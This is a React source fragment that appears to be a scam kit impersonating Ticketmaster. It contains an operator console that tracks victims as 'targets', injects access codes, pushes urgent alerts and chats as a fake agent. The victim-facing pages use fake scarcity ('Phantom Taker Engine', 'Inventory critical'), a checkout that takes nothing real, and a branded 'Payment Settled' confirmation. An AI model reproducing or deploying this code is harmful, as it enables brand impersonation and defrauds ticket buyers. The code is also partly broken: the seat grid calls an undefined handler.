            <div className="p-10 border-b border-white/5 bg-[#1f262d]/50 flex justify-between items-center shadow-3xl backdrop-blur-xl z-20">
               <div className="flex items-center gap-8">
                  <div className="w-24 h-24 bg-gradient-to-br from-[#026cdf] to-blue-900 rounded-[40px] flex items-center justify-center font-black text-white text-4xl shadow-[0_20px_50px_rgba(2,108,223,0.4)] italic tracking-tighter border-4 border-white/10">TM</div>
                  <div className="space-y-2">
                    <h2 className="text-5xl font-black tracking-tighter uppercase italic text-white leading-none drop-shadow-2xl">{activeTarget.name || 'Visitor Unidentified'}</h2>
                    <div className="flex items-center gap-4 text-gray-500 font-black text-[11px] uppercase tracking-[0.5em]">
                       <p>{activeTarget.location}</p>
                       <div className="w-2 h-2 bg-white/10 rounded-full" />
                       <p className="text-[#026cdf]">ID_{activeTarget.id.slice(-8).toUpperCase()}</p>
                    </div>
                  </div>
               </div>
               <div className="flex gap-6">
                  <div className="bg-white/5 px-8 py-4 rounded-full border border-white/5 flex items-center gap-4 shadow-inner">
                    <Activity className="w-5 h-5 text-[#026cdf] animate-pulse shadow-[0_0_15px_#026cdf]" />
                    <p className="text-[12px] font-black uppercase tracking-[0.4em] italic">{activeTarget.status}</p>
                  </div>
                  <button onClick={() => updateSession(activeTarget.id, {status: 'success_confirmed'})} className="bg-green-600 text-white px-10 py-4 rounded-full font-black text-[11px] uppercase shadow-3xl hover:bg-green-700 transition-all tracking-[0.3em] italic border-b-4 border-green-950">Confirm Settle</button>
               </div>
            </div>

            {/* Live Message Stream */}
            <div className="flex-1 p-14 overflow-y-auto space-y-10 flex flex-col scroll-pro relative z-10">
               {activeTarget.chatHistory?.map((m, i) => (
                 <div key={i} className={`flex ${m.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                    <div className={`max-w-[70%] p-8 rounded-[45px] text-[15px] font-black shadow-2xl relative ${m.sender === 'user' ? 'bg-white text-black rounded-bl-none shadow-white/5 border-4 border-white' : 'bg-gradient-to-br from-[#026cdf] to-blue-800 text-white rounded-br-none shadow-blue-500/20 border-4 border-blue-500/20 italic'}`}>
                      {m.text}
                      <p className={`text-[8px] mt-4 uppercase tracking-widest ${m.sender === 'user' ? 'text-gray-400' : 'text-white/50'}`}>{new Date(m.timestamp).toLocaleTimeString()}</p>
                    </div>
                 </div>
               ))}
               <div id="scroll-anchor" />
            </div>

            {/* Target-Specific Control Dock */}
            <div className="w-full bg-[#1f262d]/50 border-t border-white/5 p-10 flex flex-col md:flex-row gap-10 backdrop-blur-3xl">
               <div className="flex-1 bg-black/40 p-8 rounded-[45px] border-2 border-white/5 flex items-center gap-8 shadow-2xl group hover:border-[#026cdf]/50 transition-all">
                  <div className="space-y-1 w-32">
                    <p className="text-[10px] font-black uppercase text-[#026cdf] tracking-[0.3em] italic">Assign Code</p>
                    <p className="text-[8px] text-gray-500 uppercase font-bold">Inject to Target</p>
                  </div>
                  <input className="flex-1 bg-transparent font-black text-[#026cdf] text-6xl outline-none placeholder:text-gray-900 uppercase italic tracking-[0.5em]" placeholder="XXXX" onBlur={(e) => updateSession(activeTarget.id, { userAuthCode: e.target.value.trim().toUpperCase() })} defaultValue={activeTarget.userAuthCode} />
               </div>
               <div className="flex-1 bg-black/40 p-8 rounded-[45px] border-2 border-white/5 flex items-center gap-8 shadow-2xl group hover:border-[#ea0042]/50 transition-all">
                  <div className="space-y-1 w-32">
                    <p className="text-[10px] font-black uppercase text-[#ea0042] tracking-[0.3em] italic">Bell Ping</p>
                    <p className="text-[8px] text-gray-500 uppercase font-bold">Urgent Alert</p>
                  </div>
                  <input className="flex-1 bg-transparent font-black text-gray-100 text-sm outline-none placeholder:text-gray-800 uppercase italic tracking-widest" placeholder="TYPE BROADCAST MSG..." id="p-input" onKeyDown={e => { if(e.key==='Enter'){ const i = document.getElementById('p-input'); updateSession(activeTarget.id, { notifications: [...(activeTarget.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; } }} />
                  <button onClick={() => { const i = document.getElementById('p-input'); if(i.value.trim()){ updateSession(activeTarget.id, { notifications: [...(activeTarget.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; } }} className="bg-[#ea0042] p-4 rounded-full shadow-[0_0_20px_#ea0042] active:scale-75 transition-all"><Zap className="w-6 h-6 text-white" /></button>
               </div>
            </div>

            {/* Primary Chat Box */}
            <div className="p-10 border-t border-white/5 bg-[#1f262d] relative z-30">
               <div className="flex gap-6 max-w-6xl mx-auto">
                  <div className="flex-1 relative">
                     <input id="admin-chat-inp" placeholder="Send secure agent response stream..." className="w-full bg-black/40 border-4 border-white/5 p-8 rounded-[50px] font-black text-lg outline-none italic transition-all focus:border-[#026cdf]/40 focus:bg-black/60 shadow-inner" onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(activeTarget.id, e.target.value, 'system'); e.target.value='' } }} />
                     <button onClick={() => { const i = document.getElementById('admin-chat-inp'); if(i.value.trim()){ sendChatMessage(activeTarget.id, i.value, 'system'); i.value=''; } }} className="absolute right-5 top-5 bg-[#026cdf] text-white p-5 rounded-[35px] shadow-[0_20px_50px_rgba(2,108,223,0.5)] hover:bg-blue-700 active:scale-90 transition-all"><Send className="w-8 h-8" /></button>
                  </div>
               </div>
            </div>
          </>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center opacity-10 animate-fadeIn italic">
             <Activity className="w-64 h-64 mb-12 text-[#026cdf] animate-pulse" />
             <h3 className="text-6xl font-black uppercase tracking-[1.2em] text-white italic">CRYPTO SILENCE</h3>
             <p className="text-xl font-black uppercase tracking-[0.8em] text-gray-500 mt-10">No Target Active In Perimeter</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ==========================================
// VIEW: ROBUST SEAT MAP (STADIUM)
// ==========================================

function SeatMapView({ event, presaleCode, cart, setCart, globalPrice, onCheckout }) {
  const [isLocked, setIsLocked] = useState(event?.status === 'presale');
  const [view, setView] = useState('overview');
  const [enteredCode, setEnteredCode] = useState('');
  const [fakeSold, setFakeSold] = useState([]);

  // Phantom Taker Engine
  useEffect(() => {
    if (isLocked) return;
    const itv = setInterval(() => {
       const sid = `s-${Math.ceil(Math.random()*8)}-${Math.ceil(Math.random()*12)}`;
       setFakeSold(prev => [...new Set([...prev, sid])]);
    }, 4000);
    return () => clearInterval(itv);
  }, [isLocked]);

  const toggleSeat = (s) => {
    if (fakeSold.includes(s.id)) return;
    if (cart.find(item => item.id === s.id)) setCart(cart.filter(item => item.id !== s.id));
    else { if(cart.length < 8) setCart([...cart, s]); }
  };

  if (isLocked) return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]">
      <div className="bg-white w-full max-w-md rounded-[80px] shadow-[0_80px_150px_rgba(0,0,0,1)] p-16 space-y-14 animate-slideUp text-center border-8 border-white/5">
        <div className="w-28 h-28 bg-blue-50 rounded-[45px] flex items-center justify-center mx-auto mb-10 shadow-inner"><Lock className="text-[#026cdf] w-14 h-14" /></div>
        <div className="space-y-4">
           <h2 className="text-6xl font-black tracking-tighter uppercase italic leading-none">Restricted</h2>
           <p className="text-[12px] font-black uppercase tracking-[0.5em] text-gray-400">Presale Inventory Access</p>
        </div>
        <input className="w-full border-4 border-gray-100 p-8 rounded-[40px] font-black text-center text-5xl uppercase tracking-[0.8em] outline-none focus:border-[#026cdf] transition-all bg-gray-50 italic" placeholder="CODE" value={enteredCode} onChange={e=>setEnteredCode(e.target.value.toUpperCase())} />
        <button onClick={() => { if(enteredCode.trim()===presaleCode){ setIsLocked(false); } else { alert("Invalid Access Code."); } }} className="w-full bg-[#026cdf] text-white py-8 rounded-[40px] font-black shadow-3xl italic text-xl uppercase tracking-widest shadow-blue-500/50 hover:scale-105 active:scale-95 transition-all">Verify Status</button>
      </div>
    </div>
  );

  return (
    <div className="h-[calc(100vh-64px)] flex flex-col bg-[#f1f5f9] relative italic no-select">
      <div className="bg-[#ea0042] text-white text-[11px] py-3 text-center font-black tracking-[0.5em] uppercase animate-pulse shadow-2xl z-20 border-b-4 border-black/10">Urgent: Inventory critical. 1 fan just secured Floor Row 1.</div>
      <div className="flex-1 overflow-y-auto p-4 md:p-16 pb-48 scroll-pro">
        <div className="max-w-7xl mx-auto space-y-16">
          {view === 'overview' ? (
            <div className="bg-white p-16 rounded-[100px] shadow-[0_60px_120px_rgba(0,0,0,0.15)] border-8 border-white text-center animate-slideUp relative">
              <div className="space-y-4 mb-16">
                <h2 className="text-6xl md:text-[6rem] font-black tracking-tighter uppercase italic text-blue-950 leading-none">{event?.artist}</h2>
                <div className="flex justify-center gap-4 text-gray-400 font-black uppercase tracking-[0.5em] text-sm"><Globe className="w-4 h-4" /> <p>{event?.venue} • {event?.date}</p></div>
              </div>
              <div onClick={() => setView('zoom')} className="w-full max-w-3xl mx-auto aspect-video bg-gradient-to-br from-blue-50 to-blue-100/50 border-4 border-dashed border-[#026cdf] rounded-[90px] flex flex-col items-center justify-center cursor-pointer hover:scale-[1.05] transition-all relative group shadow-inner">
                <div className="absolute top-0 w-80 h-12 bg-black rounded-b-[40px] font-black text-[11px] text-white flex items-center justify-center tracking-[0.8em] border-b-8 border-black/40 shadow-2xl">STAGE</div>
                <div className="bg-white px-16 py-10 rounded-[55px] shadow-[0_30px_70px_rgba(2,108,223,0.2)] border-4 border-blue-50 flex flex-col items-center group-hover:scale-110 transition-all duration-700">
                  <span className="font-black text-[#026cdf] text-5xl tracking-tighter italic uppercase">Floor Seats</span>
                  <span className="text-[12px] font-black text-gray-400 mt-4 uppercase tracking-[0.5em]">Tap to Zoom Inventory</span>
                </div>
                <div className="absolute bottom-10 flex gap-3 animate-bounce">
                   {[...Array(3)].map((_, i) => <div key={i} className="w-2.5 h-2.5 bg-[#026cdf] rounded-full" style={{opacity: 1-(i*0.3)}} />)}
                </div>
              </div>
            </div>
          ) : (
            <div className="animate-fadeIn">
              <button onClick={() => setView('overview')} className="mb-12 text-[#026cdf] font-black text-[12px] flex items-center gap-4 bg-white px-10 py-5 rounded-full shadow-2xl uppercase tracking-[0.5em] border-4 border-white hover:scale-110 active:scale-90 transition-all"><ChevronLeft /> Stadium Core</button>
              <div className="bg-white p-16 rounded-[100px] shadow-[0_80px_160px_rgba(0,0,0,0.2)] border-8 border-white space-y-10 overflow-x-auto min-w-full relative shadow-inner">
                <div className="bg-gradient-to-b from-black to-[#1f262d] text-white text-center py-14 font-black tracking-[4em] text-sm mb-24 rounded-[60px] shadow-3xl border-b-[16px] border-gray-900 uppercase italic">STAGE</div>
                {[...Array(8)].map((_, r) => (
                  <div key={r} className="flex gap-6 justify-center">
                    {[...Array(12)].map((_, c) => {
                      const id = `s-${r+1}-${c+1}`;
                      const isSold = fakeSold.includes(id) || (r + c) % 8 === 0;
                      const isSel = cart.find(item => item.id === id);
                      const isVIP = r < 2;
                      const isResale = (r + c) % 11 === 0;
                      return (
                        <div key={id} onClick={() => handleSeat({id, section: 'Floor', row: r+1, seat: c+1, price: isVIP ? globalPrice * 4 : isResale ? globalPrice * 1.5 : globalPrice})} className={`w-12 h-12 md:w-16 md:h-16 rounded-full flex items-center justify-center text-[11px] font-black transition-all border-4 cursor-pointer relative ${isSel ? 'bg-green-500 border-green-700 text-white scale-125 shadow-[0_0_30px_#22c55e]' : isSold ? 'bg-gray-100 border-gray-100 opacity-20 text-transparent cursor-not-allowed scale-90' : isVIP ? 'bg-gradient-to-br from-amber-300 to-amber-500 border-amber-600 text-amber-950 shadow-2xl' : isResale ? 'bg-gradient-to-br from-pink-400 to-pink-600 border-pink-700 text-white shadow-2xl' : 'bg-gradient-to-br from-[#026cdf] to-blue-700 border-blue-900 text-white shadow-2xl hover:scale-125 active:scale-90 hover:z-10'}`}>
                          {isSel ? <CheckCircle className="w-8 h-8" /> : c+1}
                        </div>
                      );
                    })}
                  </div>
                ))}
                <div className="pt-20 flex justify-center gap-12 border-t border-gray-50">
                   <div className="flex items-center gap-3"><div className="w-4 h-4 rounded-full bg-amber-400" /><span className="text-[10px] font-black uppercase tracking-widest">VIP Floor</span></div>
                   <div className="flex items-center gap-3"><div className="w-4 h-4 rounded-full bg-[#026cdf]" /><span className="text-[10px] font-black uppercase tracking-widest">Standard</span></div>
                   <div className="flex items-center gap-3"><div className="w-4 h-4 rounded-full bg-pink-500" /><span className="text-[10px] font-black uppercase tracking-widest">Resale</span></div>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
      {/* Sticky Bottom Summary */}
      <div className="h-36 bg-white/95 backdrop-blur-3xl border-t-4 border-gray-100 p-10 fixed bottom-0 w-full shadow-[0_-40px_120px_rgba(0,0,0,0.3)] flex items-center justify-between z-[100]">
        <div className="space-y-2">
           <div className="flex items-center gap-3"><div className="w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_#22c55e]" /><p className="text-[14px] text-gray-400 font-black uppercase tracking-[0.5em] leading-none italic">{cart.length} Seats Secured</p></div>
           <p className="text-7xl font-black text-gray-900 tracking-tighter leading-none italic shadow-sm drop-shadow-sm">${cart.reduce((a, b) => a + b.price, 0).toFixed(2)}</p>
        </div>
        <button onClick={onCheckout} disabled={cart.length===0} className={`px-28 py-8 rounded-[50px] font-black text-white shadow-3xl transition-all uppercase tracking-[0.3em] text-3xl italic ${cart.length > 0 ? 'bg-[#026cdf] hover:bg-blue-700 hover:scale-110 active:scale-90 shadow-blue-500/60' : 'bg-gray-200 cursor-not-allowed opacity-40'}`}>Checkout Access</button>
      </div>
    </div>
  );
}

function CheckoutView({ cart, sessionId, sessionData, updateSession, onSuccess, onBack }) {
  const [loading, setLoading] = useState(false);
  const total = (cart.reduce((a, b) => a + b.price, 0) + (cart.length * 24.50) + 9.00).toFixed(2);

  const handlePay = () => {
    setLoading(true);
    updateSession(sessionId, { status: 'secure_verification' });
    setTimeout(() => { setLoading(false); onSuccess(); }, 3500);
  };

  return (
    <div className="min-h-screen bg-[#f8fafc] p-8 italic pb-48">
      <div className="max-w-6xl mx-auto space-y-16">
        <button onClick={onBack} className="text-[#026cdf] font-black text-[13px] uppercase tracking-[0.5em] flex items-center gap-4 active:scale-75 transition-all bg-white px-8 py-4 rounded-full shadow-2xl border-4 border-white"><ChevronLeft /> Adjust Selection</button>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-16">
           {/* Order Summary */}
           <div className="bg-white p-14 rounded-[80px] shadow-[0_60px_150px_rgba(0,0,0,0.1)] space-y-12 border-8 border-white relative overflow-hidden">
              <div className="absolute top-0 left-0 w-2 h-full bg-[#026cdf]" />
              <h3 className="text-5xl font-black tracking-tighter uppercase italic border-b-4 border-gray-50 pb-8 leading-none">Secure Cart</h3>
              <div className="space-y-6">
                {cart.map(s => (
                  <div key={s.id} className="flex justify-between items-center text-lg font-black border-b-2 border-gray-50 pb-6 last:border-0">
                    <div className="space-y-2"><p className="text-gray-300 text-[11px] uppercase tracking-[0.4em] font-black leading-none">Floor Section 102</p><p className="text-gray-950 uppercase italic tracking-tighter">Row {s.row}, Seat {s.seat}</p></div>
                    <p className="text-3xl font-black text-[#026cdf] tracking-tighter italic">${s.price.toFixed(2)}</p>
                  </div>
                ))}
              </div>
              <div className="bg-gray-50 p-12 rounded-[55px] space-y-5 shadow-inner border-2 border-gray-100">
                <div className="flex justify-between items-center text-[12px] font-black text-gray-400 uppercase tracking-[0.4em] leading-none"><span>Global Service Fees</span><span>${(cart.length * 24.5).toFixed(2)}</span></div>
                <div className="flex justify-between items-center text-[12px] font-black text-gray-400 uppercase tracking-[0.4em] leading-none"><span>Tax/Facility Charge</span><span>$9.00</span></div>
                <div className="flex justify-between items-center text-6xl font-black text-gray-900 tracking-tighter uppercase mt-10 italic pt-10 border-t-4 border-dashed border-gray-200"><span>Final</span><span>${total}</span></div>
              </div>
           </div>
           
           {/* Security Hub */}
           <div className="bg-white p-14 rounded-[80px] shadow-[0_80px_180px_rgba(0,0,0,0.12)] space-y-14 border-8 border-white h-fit relative">
              <div className="space-y-4">
                 <h3 className="text-5xl font-black tracking-tighter uppercase italic leading-none">Security Dock</h3>
                 <p className="text-[12px] font-black uppercase text-gray-300 tracking-[0.6em] italic">Authorized Payment Tunnel</p>
              </div>
              <div className="space-y-8">
                 <div className="bg-blue-50 p-10 rounded-[45px] border-4 border-dashed border-blue-100 text-center shadow-inner">
                    <ShieldCheck className="w-12 h-12 text-[#026cdf] mx-auto mb-6" />
                    <p className="text-[13px] text-[#026cdf] font-black uppercase italic tracking-[0.2em] leading-relaxed">System has verified your Fan Profile. Complete the transaction below to release your mobile-ready QR tickets.</p>
                 </div>
                 <div className="space-y-8">
                    <div className="bg-gray-50 p-8 rounded-[35px] border-4 border-white shadow-xl">
                       <p className="text-[10px] font-black uppercase text-gray-400 mb-4 tracking-[0.4em] italic">Electronic Delivery Address</p>
                       <p className="text-2xl font-black text-blue-950 italic tracking-tighter uppercase">{sessionData.email || 'Verified Account'}</p>
                    </div>
                    <button onClick={handlePay} className="w-full bg-[#026cdf] text-white py-10 rounded-[45px] font-black shadow-[0_30px_70px_rgba(2,108,223,0.5)] uppercase tracking-[0.3em] text-2xl italic hover:scale-105 active:scale-90 transition-all border-b-8 border-blue-900">{loading ? 'Encrypting Flow...' : 'Complete Purchase'}</button>
                    <div className="flex flex-col items-center gap-4 pt-4 opacity-30 italic">
                       <div className="flex gap-4"><CreditCard className="w-6 h-6" /><Wallet className="w-6 h-6" /><Lock className="w-6 h-6" /></div>
                       <p className="text-[10px] text-gray-400 text-center uppercase tracking-[0.8em] font-black leading-none">Global Encryption Active</p>
                    </div>
                 </div>
              </div>
           </div>
        </div>
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 24.50) + 9.00).toFixed(2);
  
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      {/* Dynamic Confetti Pieces */}
      <div className="absolute inset-0 pointer-events-none opacity-50">
         {[...Array(60)].map((_, i) => (<div key={i} className={`absolute w-4 h-16 bg-white rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*4}s`, top: `-100px`, transform: `rotate(${Math.random()*360}deg)` }} />))}
      </div>

      <div className={`bg-white w-full max-w-2xl rounded-[100px] p-20 text-center shadow-[0_120px_250px_rgba(0,0,0,0.8)] transition-all duration-1000 transform ${showPrize ? 'scale-100 opacity-100' : 'scale-50 opacity-0 translate-y-60'}`}>
         <div className="w-44 h-44 bg-green-500 rounded-[65px] flex items-center justify-center mx-auto mb-16 shadow-[0_40px_100px_rgba(34,197,94,0.6)] animate-bounce border-8 border-white/20">
            <CheckCircle className="text-white w-24 h-24 stroke-[4]" />
         </div>
         <h1 className="text-7xl md:text-8xl font-black text-gray-900 leading-tight mb-8 uppercase italic tracking-tighter italic shadow-sm">YOU GOT THE TICKETS!</h1>
         <p className="text-gray-400 font-black mb-20 text-[12px] uppercase tracking-[0.8em] italic opacity-50">Official Confirmation ID: #{Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
         
         {/* Premium Receipt Card */}
         <div className="bg-gray-50 rounded-[80px] p-16 border-8 border-dashed border-gray-100 mb-20 space-y-12 shadow-inner text-center relative overflow-hidden group">
            <Ticket className="w-24 h-24 text-[#026cdf] mx-auto mb-4 animate-pulse opacity-20" />
            <div className="flex flex-col items-center justify-center gap-6 relative z-10">
               <div className="flex items-center justify-center gap-4">
                 <span className="font-black text-5xl tracking-tighter uppercase italic text-blue-950">ticketmaster</span>
                 <div className="bg-[#026cdf] rounded-full w-8 h-8 flex items-center justify-center shadow-[0_0_30px_rgba(2,108,223,0.8)] border-4 border-white"><CheckCircle className="w-5 h-5 text-white" /></div>
               </div>
               <div className="space-y-2">
                 <p className="text-[14px] text-gray-300 font-black uppercase tracking-[1em] italic">Payment Settled</p>
                 <p className="text-[10rem] font-black text-gray-950 tracking-tighter italic leading-none drop-shadow-2xl">${total}</p>
               </div>
            </div>
         </div>
         
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-12 rounded-[60px] font-black text-4xl hover:bg-black uppercase tracking-[0.4em] italic shadow-[0_40px_100px_rgba(0,0,0,0.6)] transition-all active:scale-95 scale-110 border-b-8 border-black/50">OPEN MY TICKETS</button>
      </div>
      
      <style>{`
        @keyframes confetti {
          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
          100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        .animate-confetti { animation: confetti linear infinite; }
        .scroll-pro::-webkit-scrollbar { width: 4px; }
        .scroll-pro::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.1); border-radius: 10px; }
        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .animate-slideUp { animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .animate-fadeIn { animation: fadeIn 1.2s ease-out forwards; }
        @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .animate-slideDown { animation: slideDown 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
        .animate-shake { animation: shake 0.2s ease-in-out infinite; }
        .animate-spin-slow { animation: spin 8s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}

